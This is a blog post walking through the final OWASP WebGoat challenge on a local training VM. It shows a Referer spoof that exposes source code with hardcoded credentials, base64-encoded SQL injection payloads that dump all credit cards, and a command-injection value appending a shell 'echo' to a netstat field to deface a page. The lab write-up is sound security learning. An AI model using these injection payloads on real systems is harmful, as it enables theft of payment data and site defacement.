---
layout: post
title:  "OWASP BWA WebGoat Challenge: Final Challenge"
subtitle: "Final Challenge"
date:   2017-02-03 20:00:00 -0500
author: "coastal"
header-img: "images/site-resources/webgoat-header.jpg"
---
Instructions:

- Your mission is to break the authentication scheme, steal all the credit cards from the database, and then deface the website. You will have to use many of the techniques you have learned in the other lessons. The main webpage to deface for this site is 'webgoat_challenge_user.jsp'

<img src="{{ site.baseurl }}/images/2017-02-02-webgoat_part_23/challenge-login.jpg">

Alright, the final challenge! Let's see what the login request generates:

```
Cookie: user="eW91YXJldGhld2Vha2VzdGxpbms=";
```

```
Username=admin&Password=pass&SUBMIT=Login&user=youaretheweakestlink
```

Alright, we have one interesting cookie and an interesting field that was appended to our request. I think that cookie looks like base64. Let's decode it and see what we get:

```
$ echo eW91YXJldGhld2Vha2VzdGxpbms= | base64 -d
youaretheweakestlink
```

Aha! Alright so the cookie is the username base64 encoded. Well, maybe there is an authenticated user already that we can steal the session of!

<img src="{{ site.baseurl }}/images/2017-02-02-webgoat_part_23/failed-brute-force.jpg">

After around 6 letters deep, I decided to stop as I thought this might not be be best path forward. Let's see. Well in each challenge before we could access the source of that page by clicking a button that has now magically disappeared (Presentation Level Access Controls anyone?). Let's click on one of those old links and look at what is generated:

```
GET /WebGoat/source?source=true HTTP/1.1
Referer: page_that_we_were_on
```

Interesting. What if we change the ```Referer``` field to the challenge URL?

```
GET /WebGoat/source?source=true HTTP/1.1
Referer: http://192.168.56.101/WebGoat/attack?Screen=9&menu=3000
```
Got it! And in the source we find:

```
121      private String pass = "goodbye";
122
123      private String user = "youaretheweakestlink";
```

Sloppy devs. Probably shouldn't have kept that in the source!

## Get the Credit Cards
 
<img src="{{ site.baseurl }}/images/2017-02-02-webgoat_part_23/credit-card-page.jpg">

Okay now we have to steal the credit cards. I realized that the credit cards for this purchase were already in place (presumably for the logged in user) on the page when we got there. So on request, it would appear that the server must be looking at our cookie, determining who we are, and pulling the credit card info for us. That sounds like a SQLi vuln. Let's try some input:

```
Cookie: user=' or '1' = '1;
```

<img src="{{ site.baseurl }}/images/2017-02-02-webgoat_part_23/credit-card-injection.jpg">

Hm, looks like a failed injection (aka error). So the server probably uses plaintext reference to the user instead of base64'd reference. Let's try inserting some test SQLi in the base64'd cookie by appending a true evaluation just for our username on the end. If it comes back with our credit cards, we have figured out the logic for injecting this parameter:

```
>>> base64.b64encode("youaretheweakestlink' and '1'='1")
'eW91YXJldGhld2Vha2VzdGxpbmsnIGFuZCAnMSc9JzE='
```

<img src="{{ site.baseurl }}/images/2017-02-02-webgoat_part_23/credit-card-good-injection.jpg">

Okay! So now let's try to grab everyone's cards:

```
>>> base64.b64encode("youaretheweakestlink' or '1'='1")
'eW91YXJldGhld2Vha2VzdGxpbmsnIG9yICcxJz0nMQ=='
```

<img src="{{ site.baseurl }}/images/2017-02-02-webgoat_part_23/credit-cards-stolen.jpg">

Awesome! We've got 'em all.

## Deface the Site

Okay, now we have to deface the site. We are immediately shown some process output, presumably for processes running on the server. 

<img src="{{ site.baseurl }}/images/2017-02-02-webgoat_part_23/deface-the-site.jpg">

At the bottom of the page there is a selector where we can select a protocol (tcp, udp, ip, etc). Let's see what the request is that is generated from that selector:

```
SUBMIT=View+Network&File=tcp
```

Hmm..interesting. So the command itself looks like it could be ```netstat```. That would mean that the ```tcp``` we send might be a flag for a ```netstat``` command on the server. What happens if we append another command on the end of the ```tcp``` specification:

<img src="{{ site.baseurl }}/images/2017-02-02-webgoat_part_23/ls-deface.jpg">

Awesome! Looks like we can inject subsequent commands after the netstat command that is thrown back to the page. Let's try to deface the site:

```
SUBMIT=View+Network&File=tcp; echo '<html>pwnd</hmtl>' >> /var/lib/tomcat6/webapps/WebGoat/webgoat_challenge_user.jsp
```

<img src="{{ site.baseurl }}/images/2017-02-02-webgoat_part_23/site-defaced.jpg">

<img src="{{ site.baseurl }}/images/2017-02-02-webgoat_part_23/webgoat-completed.jpg">

And we've done it! We've defeated the mighty WebGoat. I've learned a lot about common web vulnerabilites and some of their manifestations, but I still have a lot to learn. I'm going to continue to learn and update the blog as I continue down the netsec rabbit hole.